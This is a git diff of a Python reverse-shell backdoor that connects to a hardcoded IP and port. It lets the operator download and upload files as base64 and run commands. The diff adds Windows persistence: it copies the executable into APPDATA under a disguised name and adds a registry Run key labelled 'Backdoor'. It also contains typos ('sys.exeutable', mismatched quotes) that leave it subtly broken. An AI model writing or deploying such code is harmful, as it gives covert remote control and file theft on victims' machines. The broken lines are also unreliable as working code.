@@ -5,7 +5,8 @@ import subprocess
 import json
 import os
 import base64
-
+import shutil
+import sys
 def relibale_send(data):
 	try:
 		json_data = json.dumps(data.decode('utf-8'))
@@ -38,7 +39,7 @@ def shell():
 		elif command[:8] == "download":
 			with open(command[9:], "rb") as file:
 				relibale_send(base64.b64encode(file.read()))
-		elif command[:8] == "upload":
+		elif command[:6] == "upload":
 			try:
 				with open(command[7:], "wb") as fin:
 					file_data = reliable_recv()
@@ -54,6 +55,11 @@ def shell():
 				relibale_send(result)
 			except Exception as e:
 				print(e)
+
+location = os.environ["appdata"] + "\\Avinashwindows32.exe"
+if not os.path.exists(location):
+	shutil.copyfile(sys.exeutable, location)
+	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + "'", shell=True)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("192.168.0.21", 54321))
